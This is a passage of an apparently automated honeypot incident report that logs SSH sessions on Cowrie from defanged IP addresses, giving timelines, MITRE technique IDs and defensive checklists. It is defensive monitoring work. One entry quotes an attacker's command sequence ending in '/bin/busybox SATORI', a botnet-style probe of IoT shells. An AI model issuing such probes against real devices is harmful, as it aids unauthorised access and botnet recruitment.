| `2026-08-20 07:00:46` | `cowrie.session.connect` |
| `2026-08-20 07:00:47` | `cowrie.client.version` |
| `2026-08-20 07:00:47` | `cowrie.client.kex` |
| `2026-08-20 07:00:50` | `cowrie.login.success` |
| `2026-08-20 07:00:51` | `cowrie.direct-tcpip.request` |
| `2026-08-20 07:00:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.57.154[.]146` to AbuseIPDB if not already reported
- [ ] Block `58.57.154[.]146` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-05e0c0edba32

| Field | Detail |
|---|---|
| **Source IP** | `36.154.134[.]146` |
| **First Seen** | 2026-08-20 07:04 |
| **Last Seen** | 2026-08-20 07:04 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 07:04:27` | `cowrie.session.connect` |
| `2026-08-20 07:04:28` | `cowrie.client.version` |
| `2026-08-20 07:04:28` | `cowrie.client.kex` |
| `2026-08-20 07:04:30` | `cowrie.login.success` |
| `2026-08-20 07:04:31` | `cowrie.direct-tcpip.request` |
| `2026-08-20 07:04:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.154.134[.]146` to AbuseIPDB if not already reported
- [ ] Block `36.154.134[.]146` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-207e464b9418

| Field | Detail |
|---|---|
| **Source IP** | `195.218.159[.]123` |
| **First Seen** | 2026-08-20 07:04 |
| **Last Seen** | 2026-08-20 07:04 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 07:04:41` | `cowrie.session.connect` |
| `2026-08-20 07:04:42` | `cowrie.client.version` |
| `2026-08-20 07:04:42` | `cowrie.client.kex` |
| `2026-08-20 07:04:43` | `cowrie.login.success` |
| `2026-08-20 07:04:43` | `cowrie.direct-tcpip.request` |
| `2026-08-20 07:04:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.218.159[.]123` to AbuseIPDB if not already reported
- [ ] Block `195.218.159[.]123` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fbc8e0ea0f47

| Field | Detail |
|---|---|
| **Source IP** | `112.6.11[.]184` |
| **First Seen** | 2026-08-20 07:05 |
| **Last Seen** | 2026-08-20 07:05 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 07:05:41` | `cowrie.session.connect` |
| `2026-08-20 07:05:42` | `cowrie.client.version` |
| `2026-08-20 07:05:42` | `cowrie.client.kex` |
| `2026-08-20 07:05:45` | `cowrie.login.success` |
| `2026-08-20 07:05:45` | `cowrie.direct-tcpip.request` |
| `2026-08-20 07:05:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.6.11[.]184` to AbuseIPDB if not already reported
- [ ] Block `112.6.11[.]184` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5efca917a876

| Field | Detail |
|---|---|
| **Source IP** | `122.186.18[.]3` |
| **First Seen** | 2026-08-20 07:05 |
| **Last Seen** | 2026-08-20 07:06 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 07:05:52` | `cowrie.session.connect` |
| `2026-08-20 07:05:52` | `cowrie.client.version` |
| `2026-08-20 07:05:52` | `cowrie.client.kex` |
| `2026-08-20 07:05:55` | `cowrie.login.success` |
| `2026-08-20 07:05:56` | `cowrie.direct-tcpip.request` |
| `2026-08-20 07:06:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.186.18[.]3` to AbuseIPDB if not already reported
- [ ] Block `122.186.18[.]3` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a8bf8474afdf

| Field | Detail |
|---|---|
| **Source IP** | `121.178.185[.]141` |
| **First Seen** | 2026-08-20 07:21 |
| **Last Seen** | 2026-08-20 07:21 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 07:21:36` | `cowrie.session.connect` |
| `2026-08-20 07:21:38` | `cowrie.client.version` |
| `2026-08-20 07:21:38` | `cowrie.client.kex` |
| `2026-08-20 07:21:40` | `cowrie.login.success` |
| `2026-08-20 07:21:41` | `cowrie.direct-tcpip.request` |
| `2026-08-20 07:21:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.178.185[.]141` to AbuseIPDB if not already reported
- [ ] Block `121.178.185[.]141` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a8c7a6052fde

| Field | Detail |
|---|---|
| **Source IP** | `46.224.101[.]121` |
| **First Seen** | 2026-08-20 07:21 |
| **Last Seen** | 2026-08-20 07:22 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `enable, system, shell, sh, /bin/busybox SATORI` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 07:21:54` | `cowrie.session.connect` |
| `2026-08-20 07:21:55` | `cowrie.login.success` |
| `2026-08-20 07:21:55` | `cowrie.session.params` |
| `2026-08-20 07:21:55` | `cowrie.command.input` |
| `2026-08-20 07:21:55` | `cowrie.command.failed` |
| `2026-08-20 07:21:56` | `cowrie.command.input` |
| `2026-08-20 07:21:56` | `cowrie.command.failed` |
| `2026-08-20 07:21:56` | `cowrie.command.input` |
| `2026-08-20 07:21:56` | `cowrie.command.failed` |
| `2026-08-20 07:21:56` | `cowrie.command.input` |
| `2026-08-20 07:21:56` | `cowrie.command.input` |
| `2026-08-20 07:21:56` | `cowrie.command.input` |
| `2026-08-20 07:21:56` | `cowrie.command.success` |
| `2026-08-20 07:21:56` | `cowrie.command.failed` |
| `2026-08-20 07:21:56` | `cowrie.command.success` |
| `2026-08-20 07:22:07` | `cowrie.log.closed` |
| `2026-08-20 07:22:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.224.101[.]121` to AbuseIPDB if not already reported
- [ ] Block `46.224.101[.]121` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b032053dd31d

| Field | Detail |
|---|---|
| **Source IP** | `65.20.217[.]64` |
| **First Seen** | 2026-08-20 07:28 |
| **Last Seen** | 2026-08-20 07:29 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 07:28:54` | `cowrie.session.connect` |
| `2026-08-20 07:28:55` | `cowrie.client.version` |
| `2026-08-20 07:28:55` | `cowrie.client.kex` |
| `2026-08-20 07:28:56` | `cowrie.login.success` |
| `2026-08-20 07:28:57` | `cowrie.direct-tcpip.request` |
| `2026-08-20 07:29:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.217[.]64` to AbuseIPDB if not already reported
- [ ] Block `65.20.217[.]64` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-39cb2c0acc4f

| Field | Detail |
|---|---|
| **Source IP** | `111.70.10[.]15` |
| **First Seen** | 2026-08-20 07:29 |
| **Last Seen** | 2026-08-20 07:29 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 07:29:07` | `cowrie.session.connect` |
| `2026-08-20 07:29:08` | `cowrie.client.version` |
| `2026-08-20 07:29:08` | `cowrie.client.kex` |
| `2026-08-20 07:29:10` | `cowrie.login.success` |
| `2026-08-20 07:29:11` | `cowrie.direct-tcpip.request` |
| `2026-08-20 07:29:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.10[.]15` to AbuseIPDB if not already reported
- [ ] Block `111.70.10[.]15` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ad4a84bd96f

| Field | Detail |
|---|---|
| **Source IP** | `175.43.162[.]214` |
| **First Seen** | 2026-08-20 07:34 |
| **Last Seen** | 2026-08-20 07:34 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 07:34:06` | `cowrie.session.connect` |
| `2026-08-20 07:34:07` | `cowrie.client.version` |
| `2026-08-20 07:34:07` | `cowrie.client.kex` |
| `2026-08-20 07:34:09` | `cowrie.login.success` |
| `2026-08-20 07:34:10` | `cowrie.direct-tcpip.request` |
| `2026-08-20 07:34:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `175.43.162[.]214` to AbuseIPDB if not already reported
- [ ] Block `175.43.162[.]214` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ced3c03c19d

| Field | Detail |
|---|---|
| **Source IP** | `61.145.163[.]164` |
| **First Seen** | 2026-08-20 07:34 |
| **Last Seen** | 2026-08-20 07:34 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 07:34:16` | `cowrie.session.connect` |
| `2026-08-20 07:34:17` | `cowrie.client.version` |
| `2026-08-20 07:34:17` | `cowrie.client.kex` |
| `2026-08-20 07:34:20` | `cowrie.login.success` |
| `2026-08-20 07:34:20` | `cowrie.direct-tcpip.request` |
| `2026-08-20 07:34:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.145.163[.]164` to AbuseIPDB if not already reported
- [ ] Block `61.145.163[.]164` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-90d96e48cdb7

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 07:36 |
| **Last Seen** | 2026-08-20 07:36 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 07:36:14` | `cowrie.session.connect` |
| `2026-08-20 07:36:14` | `cowrie.client.version` |
| `2026-08-20 07:36:14` | `cowrie.client.kex` |
| `2026-08-20 07:36:15` | `cowrie.login.success` |
| `2026-08-20 07:36:15` | `cowrie.direct-tcpip.request` |
| `2026-08-20 07:36:17` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-20 07:36:17` | `cowrie.direct-tcpip.data` |
| `2026-08-20 07:36:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd7e5891c0c2

| Field | Detail |
|---|---|
| **Source IP** | `119.152.54[.]111` |
| **First Seen** | 2026-08-20 07:37 |
| **Last Seen** | 2026-08-20 07:37 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 07:37:40` | `cowrie.session.connect` |
| `2026-08-20 07:37:41` | `cowrie.client.version` |
| `2026-08-20 07:37:41` | `cowrie.client.kex` |
| `2026-08-20 07:37:42` | `cowrie.login.success` |
| `2026-08-20 07:37:42` | `cowrie.direct-tcpip.request` |
| `2026-08-20 07:37:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.152.54[.]111` to AbuseIPDB if not already reported
- [ ] Block `119.152.54[.]111` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e4689a4f08f

| Field | Detail |
|---|---|
| **Source IP** | `196.190.180[.]18` |
| **First Seen** | 2026-08-20 07:37 |
| **Last Seen** | 2026-08-20 07:37 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 07:37:47` | `cowrie.session.connect` |
| `2026-08-20 07:37:48` | `cowrie.client.version` |
| `2026-08-20 07:37:48` | `cowrie.client.kex` |
| `2026-08-20 07:37:49` | `cowrie.login.success` |
| `2026-08-20 07:37:49` | `cowrie.direct-tcpip.request` |
| `2026-08-20 07:37:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.190.180[.]18` to AbuseIPDB if not already reported
- [ ] Block `196.190.180[.]18` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a91e413465c2

| Field | Detail |
|---|---|
| **Source IP** | `103.147.248[.]44` |
| **First Seen** | 2026-08-20 07:37 |
| **Last Seen** | 2026-08-20 07:38 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 07:37:53` | `cowrie.session.connect` |
| `2026-08-20 07:37:54` | `cowrie.client.version` |
| `2026-08-20 07:37:54` | `cowrie.client.kex` |
| `2026-08-20 07:37:56` | `cowrie.login.success` |
| `2026-08-20 07:37:57` | `cowrie.direct-tcpip.request` |
| `2026-08-20 07:38:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.147.248[.]44` to AbuseIPDB if not already reported
- [ ] Block `103.147.248[.]44` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-585d981aca7a

| Field | Detail |
|---|---|
| **Source IP** | `123.129.245[.]249` |
| **First Seen** | 2026-08-20 07:38 |
| **Last Seen** | 2026-08-20 07:38 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 07:38:03` | `cowrie.session.connect` |
| `2026-08-20 07:38:03` | `cowrie.client.version` |
| `2026-08-20 07:38:03` | `cowrie.client.kex` |
| `2026-08-20 07:38:05` | `cowrie.login.success` |
| `2026-08-20 07:38:06` | `cowrie.direct-tcpip.request` |
| `2026-08-20 07:38:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `123.129.245[.]249` to AbuseIPDB if not already reported
- [ ] Block `123.129.245[.]249` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c06f92ca194

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-20 07:38 |
| **Last Seen** | 2026-08-20 07:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 07:38:10` | `cowrie.session.connect` |
| `2026-08-20 07:38:10` | `cowrie.client.version` |
| `2026-08-20 07:38:10` | `cowrie.client.kex` |
| `2026-08-20 07:38:11` | `cowrie.login.success` |
| `2026-08-20 07:38:11` | `cowrie.direct-tcpip.request` |
| `2026-08-20 07:38:11` | `cowrie.direct-tcpip.data` |
| `2026-08-20 07:38:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-06a01c33b29d

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 07:38 |
| **Last Seen** | 2026-08-20 07:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 07:38:15` | `cowrie.session.connect` |
| `2026-08-20 07:38:15` | `cowrie.client.version` |
| `2026-08-20 07:38:15` | `cowrie.client.kex` |
| `2026-08-20 07:38:16` | `cowrie.login.success` |
| `2026-08-20 07:38:16` | `cowrie.direct-tcpip.request` |
| `2026-08-20 07:38:16` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-20 07:38:16` | `cowrie.direct-tcpip.data` |
| `2026-08-20 07:38:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-951bec6e15c0

| Field | Detail |
|---|---|
| **Source IP** | `80.233.12[.]109` |
| **First Seen** | 2026-08-20 07:39 |
| **Last Seen** | 2026-08-20 07:39 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 07:39:02` | `cowrie.session.connect` |
| `2026-08-20 07:39:03` | `cowrie.client.version` |
| `2026-08-20 07:39:03` | `cowrie.client.kex` |
| `2026-08-20 07:39:04` | `cowrie.login.success` |
| `2026-08-20 07:39:04` | `cowrie.direct-tcpip.request` |
| `2026-08-20 07:39:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.233.12[.]109` to AbuseIPDB if not already reported
- [ ] Block `80.233.12[.]109` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-60d9a43abbbe

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 07:47 |
| **Last Seen** | 2026-08-20 07:47 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 07:47:18` | `cowrie.session.connect` |
| `2026-08-20 07:47:18` | `cowrie.client.version` |
| `2026-08-20 07:47:18` | `cowrie.client.kex` |
| `2026-08-20 07:47:20` | `cowrie.login.success` |
| `2026-08-20 07:47:33` | `cowrie.direct-tcpip.request` |
| `2026-08-20 07:47:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a7c4c3574c0

| Field | Detail |
|---|---|
| **Source IP** | `34.77.186[.]60` |
| **First Seen** | 2026-08-20 07:48 |
| **Last Seen** | 2026-08-20 07:48 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 07:48:11` | `cowrie.session.connect` |
| `2026-08-20 07:48:11` | `cowrie.client.version` |
| `2026-08-20 07:48:11` | `cowrie.client.kex` |
| `2026-08-20 07:48:13` | `cowrie.login.success` |
| `2026-08-20 07:48:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.77.186[.]60` to AbuseIPDB if not already reported
- [ ] Block `34.77.186[.]60` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f30fac92975

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 07:49 |
| **Last Seen** | 2026-08-20 07:49 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 07:49:19` | `cowrie.session.connect` |
| `2026-08-20 07:49:19` | `cowrie.client.version` |
| `2026-08-20 07:49:20` | `cowrie.client.kex` |
| `2026-08-20 07:49:22` | `cowrie.login.success` |
| `2026-08-20 07:49:22` | `cowrie.direct-tcpip.request` |
| `2026-08-20 07:49:24` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-20 07:49:24` | `cowrie.direct-tcpip.data` |
| `2026-08-20 07:49:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f39d7dc94b99

| Field | Detail |
|---|---|
| **Source IP** | `35.205.21[.]112` |
| **First Seen** | 2026-08-20 07:49 |
| **Last Seen** | 2026-08-20 07:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 07:49:28` | `cowrie.session.connect` |
| `2026-08-20 07:49:28` | `cowrie.login.success` |
| `2026-08-20 07:49:28` | `cowrie.session.params` |
| `2026-08-20 07:49:28` | `cowrie.command.input` |
| `2026-08-20 07:49:28` | `cowrie.command.input` |
| `2026-08-20 07:49:28` | `cowrie.command.failed` |
| `2026-08-20 07:49:28` | `cowrie.command.input` |
| `2026-08-20 07:49:28` | `cowrie.log.closed` |
| `2026-08-20 07:49:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.205.21[.]112` to AbuseIPDB if not already reported
- [ ] Block `35.205.21[.]112` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b2cae574b3a5

| Field | Detail |
|---|---|
| **Source IP** | `35.205.21[.]112` |
| **First Seen** | 2026-08-20 07:49 |
| **Last Seen** | 2026-08-20 07:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 07:49:41` | `cowrie.session.connect` |
| `2026-08-20 07:49:41` | `cowrie.login.success` |
| `2026-08-20 07:49:42` | `cowrie.session.params` |
| `2026-08-20 07:49:42` | `cowrie.command.input` |
| `2026-08-20 07:49:42` | `cowrie.command.failed` |
| `2026-08-20 07:49:42` | `cowrie.log.closed` |
| `2026-08-20 07:49:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.205.21[.]112` to AbuseIPDB if not already reported
- [ ] Block `35.205.21[.]112` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dcc0c21eed8b

| Field | Detail |
|---|---|
| **Source IP** | `35.205.21[.]112` |
| **First Seen** | 2026-08-20 07:49 |
| **Last Seen** | 2026-08-20 07:50 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 07:49:43` | `cowrie.session.connect` |
| `2026-08-20 07:49:43` | `cowrie.login.success` |
| `2026-08-20 07:49:44` | `cowrie.session.params` |
| `2026-08-20 07:49:44` | `cowrie.command.input` |
| `2026-08-20 07:50:00` | `cowrie.log.closed` |
| `2026-08-20 07:50:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.205.21[.]112` to AbuseIPDB if not already reported
- [ ] Block `35.205.21[.]112` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-186d3c374917

| Field | Detail |
|---|---|
| **Source IP** | `124.160.45[.]26` |
| **First Seen** | 2026-08-20 07:55 |
| **Last Seen** | 2026-08-20 07:55 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
